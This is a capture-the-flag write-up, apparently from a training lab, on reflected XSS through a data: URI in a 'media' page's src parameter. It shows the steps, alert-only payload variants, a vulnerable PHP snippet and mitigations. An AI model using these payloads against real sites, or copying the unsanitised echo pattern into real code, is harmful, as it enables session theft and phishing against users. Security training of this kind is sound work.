# A7 - Cross-Site Scripting via Data URI

OWASP Top 10 (2017) vulnerability. The `src` parameter of the `/index.php?page=media` endpoint is injected directly into an HTML element without validating the URL scheme, allowing use of the `data:` scheme to embed arbitrary JavaScript code.

---

## Steps to Obtain the Flag

### 1. Identify the Vector

Clicking the NSA image on the main page accesses:
```
http://<IP>/index.php?page=media&src=nsa
```
The `src` parameter controls the loaded resource without scheme validation.

### 2. Build the Payload

```bash
echo -n "<script>alert(42)</script>" | base64
# PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=
```

> In this challenge only **base64**-encoded payloads work.

### 3. Inject the Data URI

```
http://<IP>/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=
```

The server inserts the `src` value without sanitizing into an `<iframe>` or `<object>` element. The browser interprets the Data URI, executes the JS, and the application returns the **flag**.

### 4. Why It Works

The vulnerable code does something like:
```php
$src = $_GET['src'];
echo '<iframe src="' . $src . '"></iframe>';
```
It doesn't validate the scheme (`data:`, `javascript:`, etc.), so any Data URI is processed directly.

---

## Payload Variants

| Technique | Payload |
|---|---|
| Direct | `data:text/html,<script>alert(42)</script>` |
| Base64 | `data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=` |
| URL Encoding | `data:text/html,%3Cscript%3Ealert(42)%3C/script%3E` |

---

## Impact

- **Session Theft:** access to cookies and authentication tokens.
- **Phishing:** injection of fake content to capture credentials.
- **Reflected XSS:** malicious URL can be sent to other users.
- **Keylogging and Defacement** in the vulnerable domain context.

---

## Mitigation

1. **Whitelist of Allowed Resources:** resolve resource on server with a map of internal keys, never use raw parameter value:
   ```php
   $allowed = ['nsa' => '/media/nsa.jpg'];
   if (!isset($allowed[$_GET['src']])) { http_response_code(404); exit(); }
   echo '<object data="' . htmlspecialchars($allowed[$_GET['src']]) . '"></object>';
   ```
2. **Block Dangerous Schemes:** reject `data:`, `javascript:`, `vbscript:`.
3. **Sanitize Output:** `htmlspecialchars($src, ENT_QUOTES, 'UTF-8')` before inserting into HTML.
4. **Content Security Policy (CSP):**
   ```
   Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self'
   ```
5. **Base64 is not Security:** it's just encoding; it doesn't protect against any attack.
